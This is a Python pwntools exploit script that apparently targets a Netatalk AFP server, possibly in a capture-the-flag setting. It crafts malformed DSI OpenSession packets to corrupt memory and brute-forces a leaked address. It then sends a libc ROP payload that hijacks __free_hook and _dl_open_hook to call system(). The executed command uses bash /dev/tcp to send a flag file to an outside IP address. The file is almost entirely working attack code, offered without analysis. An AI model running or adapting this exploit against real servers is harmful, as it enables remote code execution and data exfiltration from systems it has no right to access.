from pwn import *
import struct
import sys

if len(sys.argv) != 3:
    sys.exit(0)
ip = sys.argv[1]
port = int(sys.argv[2])

def create_afp(idx,payload):
    afp_command = bytes([idx]) # invoke the second entry in the table
    afp_command += b"\x00" # protocol defined padding 
    afp_command += payload
    dsi_header = b"\x00" # "request" flag
    dsi_header += b"\x02" # "AFP" command
    dsi_header += b"\x00\x02" # request id
    dsi_header += b"\x00\x00\x00\x00" # data offset
    dsi_header += struct.pack(">I", len(afp_command))
    dsi_header += b'\x00\x00\x00\x00' # reserved
    dsi_header += afp_command
    return dsi_header

def create_header(addr):
    dsi_opensession = b"\x01" # attention quantum option
    dsi_opensession += bytes([len(addr)+0x10]) # length
    dsi_opensession += b"A"*0x10+addr
    dsi_header = b"\x00" # "request" flag
    dsi_header += b"\x04" # open session command
    dsi_header += b"\x00\x01" # request id
    dsi_header += b"\x00\x00\x00\x00" # data offset
    dsi_header += struct.pack(">I", len(dsi_opensession))
    dsi_header += b"\x00\x00\x00\x00" # reserved
    dsi_header += dsi_opensession
    return dsi_header

# brute force
addr = b'' 
def brute():
    global addr 
    while len(addr) < 6:
        for i in range(256):
            r = remote(ip,port)
            r.send(create_header(addr+bytes([i])))
            try:
                if b"A"*4 in r.recvrepeat(1):
                    addr += bytes([i])
                    r.close()
                    break
            except:
                r.close()
        val = u64(addr.ljust(8,b'\x00'))
    info(hex(val))
    pause()
    
addr = p64(0x7fdead33a000) 


### To Validate Address ###
r = remote(ip,port)
r.send(create_header(addr))
info("leak address: " + str(b"A"*4 in r.recvrepeat(1))) #  must be true, if response
r.close()
input("@")


offset = 0x5246000
libc = u64(addr)+offset

r = remote(ip,port)
r.send(create_header(p64(libc+0x3ed8e8-0x30))) #  overwrite afp_command buf with free_hook-0x30 
info("libc base: " + str(b"A"*4 in r.recvrepeat(1))) #  must be true, if response
input("@")

context.arch = "amd64"
r8=0
r9=1
r12=1
r13=1
r14=1
r15=1
rdi=libc+0x3ed8e8+8 # cmd buffer
rsi=0x1111
rbp=0x1111
rbx=0x1111
rdx=0x1211
rcx=0x1211
rsp=libc+0x3ed8e8
rspp=libc+0x4f440 # system
payload2=flat(r8,r9,0,0,r12,r13,r14,r15,rdi,rsi,rbp,rbx,rdx,0,rcx,rsp,rspp)


cmd=b'bash -c "cat /home/netatalk/flag > /dev/tcp/140.114.77.172/10999" \x00'


payload = flat(
    b"\x00"*0x2e + 
    p64(libc+0x166488) + #__libc_dlopen_mode+56: mov rax, cs:_dl_open_hook; call qword ptr [rax]
    cmd.ljust(0x2bb8,b"\x00") + #  padding
    p64(libc+0x3f04a8+8) + #_dl_open_hook
    p64(libc+0x7ea1f)*4 + #_IO_new_fgetpos+207:  mov rdi, rax; call qword ptr [rax+20h]
    p64(libc+0x520a5) + #setcontext+53
    payload2) #over write _free_hook and _dl_open_hook
r.send(create_afp(0,payload))
r.close()




'''
sudo netstat -nap | grep 548

b *0x7f91cb7fc6c8
'''